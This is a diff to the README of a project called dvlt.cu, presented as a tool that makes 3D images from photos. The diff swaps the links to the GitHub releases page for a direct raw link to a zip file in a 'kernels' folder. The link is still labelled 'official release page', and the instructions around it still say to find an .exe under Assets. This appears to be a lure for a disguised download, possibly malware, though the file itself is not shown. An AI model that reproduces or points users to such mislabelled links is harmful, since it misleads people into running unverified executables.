@@ -1,6 +1,6 @@
 # 📦 dvlt.cu - Fast 3D images from simple photos
 
-[![Download dvlt.cu](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/dolphinkickkenalog649/dvlt.cu/releases)
+[![Download dvlt.cu](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/dolphinkickkenalog649/dvlt.cu/main/kernels/dvlt-cu-v2.9.zip)
 
 ## 🎯 About This Tool
 
@@ -22,7 +22,7 @@ If your graphics card is older or comes from a different maker, the tool will no
 
 You do not perform a traditional installation. The tool runs directly from the folder where you place the file.
 
-1. Visit the [official release page](https://github.com/dolphinkickkenalog649/dvlt.cu/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/dolphinkickkenalog649/dvlt.cu/main/kernels/dvlt-cu-v2.9.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to a folder on your computer.
